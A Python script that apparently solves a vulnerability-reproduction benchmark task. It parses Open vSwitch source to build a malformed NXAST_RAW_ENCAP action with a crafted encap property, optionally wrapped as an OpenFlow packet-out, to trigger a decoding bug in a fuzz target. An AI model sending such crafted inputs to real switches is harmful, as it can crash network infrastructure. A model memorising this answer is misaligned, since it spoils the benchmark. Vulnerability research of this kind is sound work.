import os
import re
import tarfile
import tempfile
import shutil
import struct
from typing import Dict, List, Optional, Tuple, Iterable


def _read_file_text(path: str, max_bytes: int = 2_500_000) -> str:
    try:
        with open(path, "rb") as f:
            data = f.read(max_bytes + 1)
        if len(data) > max_bytes:
            data = data[:max_bytes]
        return data.decode("utf-8", errors="ignore")
    except Exception:
        return ""


_BLOCK_COMMENT_RE = re.compile(r"/\*.*?\*/", re.DOTALL)
_LINE_COMMENT_RE = re.compile(r"//.*?$", re.MULTILINE)


def _strip_c_comments(s: str) -> str:
    s = _BLOCK_COMMENT_RE.sub("", s)
    s = _LINE_COMMENT_RE.sub("", s)
    return s


def _iter_source_files(root: str, exts: Tuple[str, ...] = (".c", ".h", ".cc", ".cpp")) -> Iterable[str]:
    for dirpath, dirnames, filenames in os.walk(root):
        dn = os.path.basename(dirpath).lower()
        if dn in (".git", ".svn", "build", "dist", "out", "cmake-build-debug", "cmake-build-release"):
            dirnames[:] = []
            continue
        for fn in filenames:
            if fn.endswith(exts):
                yield os.path.join(dirpath, fn)


def _find_file_by_basename(root: str, basename: str) -> Optional[str]:
    for p in _iter_source_files(root, exts=(".c", ".h", ".cc", ".cpp")):
        if os.path.basename(p) == basename:
            return p
    return None


def _extract_tar_to_temp(src_path: str) -> Tuple[str, Optional[str]]:
    if os.path.isdir(src_path):
        return src_path, None
    td = tempfile.mkdtemp(prefix="arvo_poc_")
    try:
        with tarfile.open(src_path, "r:*") as tf:
            tf.extractall(td)
    except Exception:
        shutil.rmtree(td, ignore_errors=True)
        raise
    return td, td


def _parse_int_literal(expr: str) -> Optional[int]:
    expr = expr.strip()
    expr = expr.split()[0].strip()
    expr = expr.strip("()")
    m = re.search(r"(0x[0-9A-Fa-f]+|\d+)", expr)
    if not m:
        return None
    try:
        return int(m.group(1), 0)
    except Exception:
        return None


def _parse_defines(text: str) -> Dict[str, int]:
    out: Dict[str, int] = {}
    for m in re.finditer(r"^\s*#\s*define\s+([A-Za-z_]\w*)\s+(.+)$", text, re.MULTILINE):
        name = m.group(1)
        rhs = m.group(2)
        rhs = rhs.split("\\\n")[0]
        rhs = rhs.split("/*", 1)[0]
        rhs = rhs.split("//", 1)[0]
        val = _parse_int_literal(rhs)
        if val is not None:
            out[name] = val
    return out


def _parse_enum_blocks(text: str) -> Dict[str, int]:
    out: Dict[str, int] = {}
    text_nc = _strip_c_comments(text)
    for em in re.finditer(r"\benum\b[^;{]*\{", text_nc):
        start = em.end()
        i = start
        depth = 1
        while i < len(text_nc) and depth > 0:
            c = text_nc[i]
            if c == "{":
                depth += 1
            elif c == "}":
                depth -= 1
                if depth == 0:
                    end = i
                    break
            i += 1
        else:
            continue
        body = text_nc[start:end]
        body = re.sub(r"\s+", " ", body)
        parts = [p.strip() for p in body.split(",")]
        cur = -1
        for part in parts:
            if not part:
                continue
            m = re.match(r"^([A-Za-z_]\w*)\s*(?:=\s*(.+))?$", part)
            if not m:
                continue
            name = m.group(1)
            rhs = m.group(2)
            if rhs is not None:
                val = _parse_int_literal(rhs)
                if val is None:
                    cur += 1
                else:
                    cur = val
            else:
                cur += 1
            if name not in out:
                out[name] = cur
    return out


def _find_identifier_value(root: str, ident: str) -> Optional[int]:
    for p in _iter_source_files(root, exts=(".h", ".c", ".cc", ".cpp")):
        txt = _read_file_text(p)
        if ident not in txt:
            continue
        defs = _parse_defines(txt)
        if ident in defs:
            return defs[ident]
        enums = _parse_enum_blocks(txt)
        if ident in enums:
            return enums[ident]
        for line in txt.splitlines():
            if ident in line and ("=" in line or "#define" in line):
                v = _parse_int_literal(line)
                if v is not None:
                    return v
    return None


def _extract_function_snippet(text: str, func_name: str, max_len: int = 20000) -> str:
    idx = text.find(func_name)
    if idx < 0:
        return ""
    start = max(0, idx - 500)
    end = min(len(text), idx + max_len)
    return text[start:end]


def _extract_case_labels(func_snippet: str) -> List[str]:
    sn = _strip_c_comments(func_snippet)
    labels = []
    for m in re.finditer(r"\bcase\s+([A-Za-z_]\w*)\s*:", sn):
        labels.append(m.group(1))
    seen = set()
    out = []
    for x in labels:
        if x not in seen:
            seen.add(x)
            out.append(x)
    return out


def _pick_ed_prop_case(case_labels: List[str]) -> Optional[str]:
    if not case_labels:
        return None
    keywords = ("HEADER", "HDR", "RAW", "DATA", "BYTES", "PAYLOAD")
    bad = ("END", "PAD", "UNSPEC", "RESERVED")
    for lab in case_labels:
        u = lab.upper()
        if any(k in u for k in keywords) and not any(b in u for b in bad):
            return lab
    return case_labels[0]


def _extract_decode_raw_encap_struct_name(ofp_actions_text: str) -> Optional[str]:
    sn = _extract_function_snippet(ofp_actions_text, "decode_NXAST_RAW_ENCAP", max_len=8000)
    if not sn:
        return None
    sn_nc = _strip_c_comments(sn)
    m = re.search(r"\bstruct\s+([A-Za-z_]\w*raw_encap\w*)\s*\*", sn_nc, re.IGNORECASE)
    if m:
        return m.group(1)
    m = re.search(r"\bstruct\s+([A-Za-z_]\w*RAW_ENCAP\w*)\s*\*", sn_nc)
    if m:
        return m.group(1)
    return None


def _find_struct_definition_text(root: str, struct_name: str) -> Optional[str]:
    pat = re.compile(r"\bstruct\s+" + re.escape(struct_name) + r"\b")
    for p in _iter_source_files(root, exts=(".h", ".c")):
        txt = _read_file_text(p)
        if not pat.search(txt):
            continue
        txt_nc = _strip_c_comments(txt)
        m = re.search(r"\bstruct\s+" + re.escape(struct_name) + r"\b[^;{]*\{", txt_nc)
        if not m:
            continue
        start = m.end()
        i = start
        depth = 1
        while i < len(txt_nc) and depth > 0:
            c = txt_nc[i]
            if c == "{":
                depth += 1
            elif c == "}":
                depth -= 1
                if depth == 0:
                    end = i
                    break
            i += 1
        else:
            continue
        body = txt_nc[start:end]
        return body
    return None


def _ctype_size(ctype: str) -> Optional[int]:
    ctype = ctype.strip()
    ctype = re.sub(r"\s+", " ", ctype)
    base = ctype.replace("const ", "").replace("volatile ", "").strip()
    if base in ("uint8_t", "int8_t", "char", "unsigned char", "signed char"):
        return 1
    if base in ("uint16_t", "int16_t", "short", "unsigned short", "signed short"):
        return 2
    if base in ("uint32_t", "int32_t", "int", "unsigned int", "signed int", "long", "unsigned long", "signed long"):
        return 4
    if base in ("uint64_t", "int64_t", "long long", "unsigned long long", "signed long long"):
        return 8
    if base in ("ovs_be16",):
        return 2
    if base in ("ovs_be32",):
        return 4
    if base in ("ovs_be64",):
        return 8
    if base.startswith("struct "):
        if base == "struct nx_action_header":
            return 16
    return None


def _parse_struct_fields(struct_body: str) -> Tuple[List[Tuple[str, str, Optional[int]]], int, Optional[str]]:
    fields: List[Tuple[str, str, Optional[int]]] = []
    offset = 0
    flex_member = None

    body = _strip_c_comments(struct_body)
    lines = [ln.strip() for ln in body.splitlines()]
    for ln in lines:
        if not ln or ln.startswith("#"):
            continue
        ln = ln.rstrip(";").strip()
        ln = re.sub(r"\s+", " ", ln)
        if ln.startswith("union ") or ln.startswith("struct ") and "{" in ln:
            continue
        m = re.match(r"^(.+?)\s+([A-Za-z_]\w*)(\s*\[\s*(.*?)\s*\])?$", ln)
        if not m:
            continue
        ctype = m.group(1).strip()
        name = m.group(2).strip()
        arr = m.group(4)
        arr_len: Optional[int] = None
        if arr is not None:
            arr = arr.strip()
            if arr == "":
                flex_member = name
                fields.append((ctype, name, None))
                break
            val = _parse_int_literal(arr)
            if val is None:
                flex_member = name
                fields.append((ctype, name, None))
                break
            arr_len = int(val)
            if arr_len == 0:
                flex_member = name
                fields.append((ctype, name, 0))
                break

        sz = _ctype_size(ctype)
        if sz is None:
            if ctype.startswith("struct "):
                sz = 16 if ctype.strip() == "struct nx_action_header" else None
        if sz is None:
            continue

        if arr_len is None:
            fields.append((ctype, name, None))
            offset += sz
        else:
            fields.append((ctype, name, arr_len))
            offset += sz * arr_len

    fixed_size = offset
    return fields, fixed_size, flex_member


def _detect_input_mode(root: str) -> Tuple[str, int]:
    candidates = []
    for p in _iter_source_files(root, exts=(".c", ".cc", ".cpp")):
        txt = _read_file_text(p)
        if "LLVMFuzzerTestOneInput" in txt or "AFL" in txt or "fuzz" in p.lower():
            candidates.append((p, txt))
    for p, txt in candidates:
        if "ofpacts" in txt or "ofpact" in txt or "ofp_actions" in txt or "ofp-actions" in txt:
            tnc = _strip_c_comments(txt)
            for n in (1, 2, 4, 8, 16):
                if re.search(r"\bdata\s*\+\s*%d\b" % n, tnc) and re.search(r"\bsize\s*-\s*%d\b" % n, tnc):
                    return ("prefix", n)
            if "struct ofp_header" in tnc or "ofpraw_decode" in tnc or "ofpmsg" in tnc:
                return ("ofmsg", 0)
            return ("actions", 0)
    return ("actions", 0)


def _build_poc_actions(root: str) -> bytes:
    ofp_actions_path = _find_file_by_basename(root, "ofp-actions.c")
    ofp_actions_text = _read_file_text(ofp_actions_path) if ofp_actions_path else ""

    subtype = _find_identifier_value(root, "NXAST_RAW_ENCAP")
    if subtype is None:
        subtype = 0

    vendor = _find_identifier_value(root, "NX_VENDOR_ID")
    if vendor is None:
        vendor = 0x00002320

    wire_struct_name = _extract_decode_raw_encap_struct_name(ofp_actions_text) or "nx_action_raw_encap"
    struct_body = _find_struct_definition_text(root, wire_struct_name)
    fields: List[Tuple[str, str, Optional[int]]] = []
    fixed_size = 24
    if struct_body:
        fields, fixed_size, _flex = _parse_struct_fields(struct_body)
        if fixed_size < 16:
            fixed_size = 16

    ed_snip = _extract_function_snippet(ofp_actions_text, "decode_ed_prop", max_len=16000)
    cases = _extract_case_labels(ed_snip)
    prop_ident = _pick_ed_prop_case(cases) or "NX_ED_PROP_HEADER"
    prop_type = _find_identifier_value(root, prop_ident)
    if prop_type is None:
        prop_type = 0

    action_total_len = 72
    if fixed_size >= action_total_len:
        action_total_len = ((fixed_size + 7) // 8) * 8 + 48

    props_total = action_total_len - fixed_size
    if props_total < 8:
        props_total = 8
        action_total_len = fixed_size + props_total
        action_total_len = ((action_total_len + 7) // 8) * 8
        props_total = action_total_len - fixed_size

    prop_len_field = props_total
    if prop_len_field < 4:
        prop_len_field = 4
    payload_len = prop_len_field - 4
    if payload_len < 0:
        payload_len = 0

    payload = bytearray()
    for i in range(payload_len):
        payload.append((0x41 + (i % 26)) & 0xFF)

    prop = struct.pack("!HH", prop_type & 0xFFFF, prop_len_field & 0xFFFF) + bytes(payload)
    if len(prop) < props_total:
        prop += b"\x00" * (props_total - len(prop))
    elif len(prop) > props_total:
        prop = prop[:props_total]

    fixed = bytearray(b"\x00" * fixed_size)

    fixed[0:2] = struct.pack("!H", 0xFFFF)
    fixed[2:4] = struct.pack("!H", action_total_len & 0xFFFF)
    fixed[4:8] = struct.pack("!I", vendor & 0xFFFFFFFF)
    fixed[8:10] = struct.pack("!H", subtype & 0xFFFF)

    if struct_body and fields:
        off = 0
        for ctype, name, arr_len in fields:
            sz = _ctype_size(ctype)
            if sz is None:
                if ctype.strip() == "struct nx_action_header":
                    sz = 16
                else:
                    continue
            if name in ("nxah", "header") and sz == 16:
                off += sz
                continue
            if arr_len is not None and arr_len != 0:
                off += sz * arr_len
                continue
            if arr_len == 0:
                break

            if off + sz > fixed_size:
                break

            lname = name.lower()
            if sz == 4 and ("pkt_type" in lname or "packet_type" in lname):
                val = 0x00000800
                fixed[off:off + 4] = struct.pack("!I", val)
            elif sz == 2 and ("n_props" in lname or "num_props" in lname or "nprop" in lname):
                fixed[off:off + 2] = struct.pack("!H", 1)
            elif sz == 2 and ("props_len" in lname or ("prop" in lname and "len" in lname)):
                fixed[off:off + 2] = struct.pack("!H", props_total & 0xFFFF)
            elif sz == 4 and ("props_len" in lname or ("prop" in lname and "len" in lname)):
                fixed[off:off + 4] = struct.pack("!I", props_total & 0xFFFFFFFF)
            off += sz

    action = bytes(fixed) + prop
    if len(action) != action_total_len:
        if len(action) < action_total_len:
            action += b"\x00" * (action_total_len - len(action))
        else:
            action = action[:action_total_len]
    return action


def _wrap_as_openflow_packet_out_v10(actions: bytes) -> bytes:
    version = 0x01
    ofpt_packet_out = 13
    xid = 0
    buffer_id = 0xFFFFFFFF
    in_port = 0xFFFF
    actions_len = len(actions)
    msg_len = 8 + 8 + actions_len
    hdr = struct.pack("!BBHI", version, ofpt_packet_out, msg_len & 0xFFFF, xid & 0xFFFFFFFF)
    body = struct.pack("!IHH", buffer_id & 0xFFFFFFFF, in_port & 0xFFFF, actions_len & 0xFFFF)
    return hdr + body + actions


class Solution:
    def solve(self, src_path: str) -> bytes:
        root, tmp = _extract_tar_to_temp(src_path)
        try:
            actions = _build_poc_actions(root)
            mode, prefix_n = _detect_input_mode(root)
            if mode == "prefix" and prefix_n > 0:
                pref = bytes([0x06] * prefix_n)
                return pref + actions
            if mode == "ofmsg":
                return _wrap_as_openflow_packet_out_v10(actions)
            return actions
        finally:
            if tmp is not None:
                shutil.rmtree(tmp, ignore_errors=True)